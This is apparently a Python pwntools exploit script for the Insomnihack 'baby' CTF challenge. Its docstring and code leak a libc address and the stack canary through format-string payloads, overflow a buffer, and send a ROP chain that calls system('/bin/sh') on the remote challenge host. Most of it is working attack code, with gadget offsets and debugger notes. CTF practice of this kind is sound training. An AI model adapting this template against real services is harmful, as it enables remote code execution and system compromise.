#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''

Strategy:
==========
1. Leak a libc address from the stack and calculate the libc base address
2. Leak the stack cookie
3. Trigger the buffer overflow and get RIP control
4. Do some rop magic

Tricks:
========
Rename to libc.so.6 and:
LD_LIBRARY_PATH=. ./baby


1)  Cookie stored at the beginning of the function at [rbp - 8]
 
Cookie breakpoint               https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/
br *dofmt+17 
   0x7f379ee674d9 <dofmt+17>:   mov    rax,QWORD PTR fs:0x28         // copy canary pointer into RAX
=> 0x7f379ee674e2 <dofmt+26>:   mov    QWORD PTR [rbp-0x8],rax       // copy the canary content into RAX
   0x7f379ee674e6 <dofmt+30>:   xor    eax,eax                       // zero out the canary 

br *dofmt+135

        RAX: 0x83511eb77edda800 

br *dostack+160
   0x7fd9efbe14b2 <dostack+160>:    mov    rcx,QWORD PTR [rbp-0x8]
=> 0x7fd9efbe14b6 <dostack+164>:    xor    rcx,QWORD PTR fs:0x28
   0x7fd9efbe14bf <dostack+173>:    je     0x7fd9efbe14c6 <dostack+180>
   0x7fd9efbe14c1 <dostack+175>:    call   0x7fd9efbe0e30 <__stack_chk_fail@plt>
        
        RCX: 0xec3c87dd37f3f200 


2) Libc and system
> rabin2 -s libc.so.6 | grep system
vaddr=0x00045390 paddr=0x00045390 ord=584 fwd=NONE sz=45 bind=GLOBAL type=FUNC name=__libc_system


3)  Overflow RIP
    
    Payload  = "A"* 1032 + cookie + RBP + RIP


4) Build the ROP chain

According to the x86_64 ABI, the first 6 integer or pointer arguments to a function are passed in registers. 
The first is placed in rdi, the second in rsi, the third in rdx, and then rcx, r8 and r9. 
Only the 7th argument and onwards are passed on the stack.

    RDI
    RSI
    RDX
    RCX
    R8
    R9

 Registers controlled after crash
 =================================

    RBP: 0x4545454545454545 ('EEEEEEEE')
    RSP: 0x7ffe895c44e8 ("DDDDDDDDAAA%AAsAABAA$AAn
    RIP: 0x7fc5e80e94c7 (<dostack+181>: ret)
    R13: 0x7ffe895c4650 ("A%pA%TA%qA%UA%r", 'A' <repeats 185 times>...)   //  [R13] --> offset 352 - size ~43

 Possible gadgets
 ==================
    1) Get "/bin/sh" into RDI
        0x0000000000020256 : pop rdi ; pop rbp ; ret
        0x0000000000021102 : pop rdi ; ret
        0x0000000000106829 : pop rax ; pop rdi ; call rax

    2) Get system() into RPI
        

    3) Jump into system
        0x0000000000003838 : pop rsp ; ret
        0x0000000000000937 : ret  // ??


    gdb-peda$ find "/bin/sh"
    Searching for '/bin/sh' in: None ranges
    Found 2 results, display max 2 items:
      libc : 0x7fc5e7c7d3e8 --> 0x68732f6e69622f ('/bin/sh')
    [heap] : 0x7fc5e9acf05b --> 0x68732f6e69622f ('/bin/sh')





# verify cookie
br *dostack+160
set follow-fork-mode child
c

'''
from pwn import *
import re
import socket  
import sys  
import struct  
import telnetlib


def perror():
    sys.exit("python {0} remote/local".format(sys.argv[0]))

try:
    arg1 = str(sys.argv[1])
except:
    perror()


PORT = 1337
if (arg1 == "remote"):
    HOST = "baby.teaser.insomnihack.ch"
elif (arg1 == "local"):
    HOST = "127.0.0.1"
else:
    perror()


def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def readuntil(s, delim='\n'):
    x = ""
    while not x.endswith(delim):
        x += s.recv(1)
    return x

def chain2stringx64(rop):
    return "".join([struct.pack("<Q", x) for x in rop])


def pause():
    print "[*] Paused, press ENTER to continue."
    raw_input()


def connect():
    # Connect to target
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.connect((HOST, PORT))
    # print("[*] Connecting to {0}:{1}".format(HOST,PORT))
    # return s
    global s
    s = remote(HOST, PORT)
    return s


def dofmt():
    choice="2"

    global libc, cookie

    s.readuntil("> ")
    s.sendline(choice)
    s.readuntil("> ")
    s.sendline("%158$llx")      
    libc_str = s.recvline().strip()
    libc = int(libc_str,16)
    log.info("2.dofmt()=> Leaking <__libc_start_main+245> at: {:x}".format(libc))
    

    #s.sendline(choice)
    s.readuntil("> ")
    s.sendline("%138$llx")
    cookie = s.recvline().strip()
    cookie = (re.search(r"[0-9A-Fa-f]{16}", cookie)).group(0)
    log.info("2.dofmt()=> Leaking stack cookie: {}".format(cookie))
    print "cookie:%s:" %cookie
    assert(len(cookie) == 16)
    cookie = p64(int(cookie,16))
    
    #pause()

    # Back to main menu
    s.sendline("")


def  dostack():

    choice = "1"
    
    RBP = "EEEEEEEE"
    RIP = "DDDDDDDD"

    log.info("1.dostack()=> ")
    
    # Generate payload
    ROPCHAIN = rop()

    # buff = "A"* 1032 + cookie + RBP + RIP 
    buff = "A"* 1032 + cookie + RBP + ROPCHAIN #+ 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwADZADxADyADzA;%A;sA;BA;$A;nA;CA;-A;(A;DA;;A;)A;EA;aA;0A;FA;bA;1A;GA;cA;2A;HA;dA;3A;IA;eA;4A;JA;fA;5A;KA;gA;6A;LA;hA;7A;MA;iA;8A;NA;jA;9A;OA;kA;PA;lA;QA;mA;RA;oA;SA;pA;TA;qA;UA;rA;VA;tA;WA;uA;XA;vA;YA;wA;ZA;xA;yA;zA)%A)sA)BA)$A)nA)CA)-A)(A)DA);A))A)EA)aA)0A)FA)bA)1A)GA)cA)2A)HA)dA)3A)IA)eA)4A)JA)fA)5A)KA)gA)6A)LA)hA)7A)MA)iA)8A)NA)jA)9A)OA)kA)PA)lA)QA)mA)RA)oA)SA)pA)TA)qA)UA)rA)VA)tA)WA)uA)XA)vA)YA)wA)ZA)xA)yA)zAE%AEsAEBAE$AEnAECAE-AE(AEDAE;AE)AEEAEaAE0AEFAEbAE1AEGAEcAE2AEHAEdAE3AEIAEeAE4AEJAEfAE5AEKAEgAE6AELAEhAE7AEMAEiAE8AENAEjAE9AEOAEkAEPAElAEQAEmAERAEoAESAEpAETAEqAEUAErAEVAEtAEWAEuAEXAEvAEYAEwAEZAExAEyAEzAa%AasAaBAa$AanAaCAa-Aa(AaDAa;Aa)AaEAaaAa0AaFAabAa1AaGAacAa2AaHAadAa3AaIAaeAa4AaJAafAa5AaKAagAa6AaLAahAa7AaMAaiAa8AaNAajAa9AaOAakAaPAalAaQAamAaRAaoAaSAapAaTAaqAaUAarAaVAatAaWAauAaXAavAaYAawAaZAaxAayAazA0%A0sA0BA0$A0nA0CA0-A0(A0DA0;A0)A0EA0aA00A0FA0bA01A0GA0cA02A0HA0dA03A0IA0eA04A0JA0fA05A0KA0gA06A0LA0hA07A0MA0iA08A0NA0jA09A0OA0kA0PA0lA0QA0mA0RA0oA0SA0pA0TA0qA0UA0rA0VA0tA0WA0uA0XA0vA0YA0wA0ZA0xA0yA0zAF%AFsAFBAF$AFnAFCAF-AF(AFDAF;AF)AFEAFaAF0AFFAFbAF1AFGAFcAF2AFHAFdAF3AFIAFeAF4AFJAFfAF5AFKAFgAF6AFLAFhAF7AFMAFiAF8AFNAFjAF9AFOAFkAFPAFlAFQAFmAFRAFoAFSAFpAFTAFqAFUAFrAFVAFtAFWAFuAFXAFvAFYAFwAFZAFxAFyAFzAb%AbsAbBAb$AbnAbCAb-Ab(AbDAb;Ab)AbEAbaAb0AbFAbbAb1AbGAbcAb2AbHAbdAb3AbIAbeAb4AbJAbfAb5AbKAbgAb6AbLAbhAb7AbMAbiAb8AbNAbjAb9AbOAbkAbPAblAbQAbmAbRAboAbSAbpAbTAbqAbUAbrAbVAbtAbWAbuAbXAbvAbYAbwAbZAbxAbyAbzA1%A1sA1BA1$A1nA1CA1-A1(A1DA1;A1)A1EA1aA10A1FA1bA11A1GA1cA12A1HA1dA13A1IA1eA14A1JA1fA15A1KA1gA16A1LA1hA17A1MA1iA18A1NA1jA19A1OA1kA1PA1lA1QA1mA1RA1oA1SA1pA1TA1qA1UA1rA1VA1tA1WA1uA1XA1vA1YA1wA1ZA1xA1yA1zAG%AGsAGBAG$AGnAGCAG-AG(AGDAG;AG)AGEAGaAG0AGFAGbAG1AGGAGcAG2AGHAGdAG3AGIAGeAG4AGJAGfAG5AGKAGgAG6AGLAGhAG7AGMAGiAG8AGNAGjAG9AGOAGkAGPAGlAGQAGmAGRAGoAGSAGpAGTAGqAGUAGrAGVAGtAGWAGuAGXAGvAGYAGwAGZAGxAGyAGzAc%AcsAcBAc$AcnAcCAc-Ac(AcDAc;Ac)AcEAcaAc0AcFAcbAc1AcGAccAc2AcHAcdAc3AcIAceAc4AcJAcfAc5AcKAcgAc6AcLAchAc7AcMAciAc8AcNAcjAc9AcOAckAcPAclAcQAcmAcRAcoAcSAcpAcTAcqAcUAcrAcVActAcWAcuAcXAcvAcYAcwAcZAcxAcyAczA2%A2sA2BA2$A2nA2CA2-A2(A2DA2;A2)A2EA2aA20A2FA2bA21A2GA2cA22A2HA2dA23A2IA2e'

    log.info("Sending choice {}".format(choice))
    s.sendline(choice)
    
    buffsz = str(len(buff))
    s.readuntil("bytes you want to send ? ")
    #log.info("Sending buffsz {}".format(buffsz))
    s.sendline(buffsz)
    #log.info("Sending buff {}".format(buff))
    s.sendline(buff)     
    
    #s.interactive()
    log.info("got root?")
    pause()


def rop():  
    try:
        log.info("Building ROP chain")
        
        # Build ropchain
        system_offset = 0x45390
        binsh_stack   = 0x1633e8   # libc : 0x7fc5e7c7d3e8 --> 0x68732f6e69622f ('/bin/sh')
        binsh_libc    = 0x018c177

        # ropchain = [
        #     libc + 0x0000000000021102,  # pop rdi ; ret
        #     binsh                    ,  # rdi = "/bin/sh\x00"
        #     libc + system            ,  # 
        # ]
        libc = 0x00007fa9edb8a000
        ropchain = [
            libc + 0x0000000000106829,  # pop rax ; pop rdi ; call rax
            libc + system_offset     ,  # rax = system()
            binsh_stack              ,  # rdi = "/bin/sh\x00"
        ]
                
        print "1st gadget at: ", hex(ropchain[0])

        # Interact with the shell
        #interact()
        #pause()        
        return chain2stringx64(ropchain)

    except socket.errno:
        raise


def main():
    s = connect() 
    dofmt()
    dostack()

    
    


if __name__ == '__main__':  
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)